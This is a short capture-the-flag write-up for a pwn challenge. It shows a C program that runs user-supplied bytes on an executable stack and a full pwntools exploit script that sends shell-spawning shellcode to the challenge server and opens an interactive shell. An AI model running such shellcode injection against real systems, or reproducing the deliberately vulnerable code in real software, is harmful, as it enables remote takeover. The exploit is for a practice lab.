## Description

Pwn · CTF.mn league · Superior
Solved: 6 · Score: 985
nc 139.59.230.119 10371
Files:

challenge
challenge.c

## Solution

First basic file check :D

```
challenge: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=caa10db884f7ecffb987e56b654a153bee6986ab, for GNU/Linux 3.2.0, not stripped
```
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
uhoh... stinky... stack executable :D

```c
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    char code[256];
    read(STDIN_FILENO, code, 256);
    (*(void(*)()) code)();

    return 0;
}
```
i really need to know how the shell code is crafted i just use the built in shellcraft in pwntools :P
```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'challenge')

host = args.HOST or '139.59.230.119'
port = int(args.PORT or 10371)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

shellcode = asm(shellcraft.sh())

io = start()

io.send(shellcode)

io.interactive()


```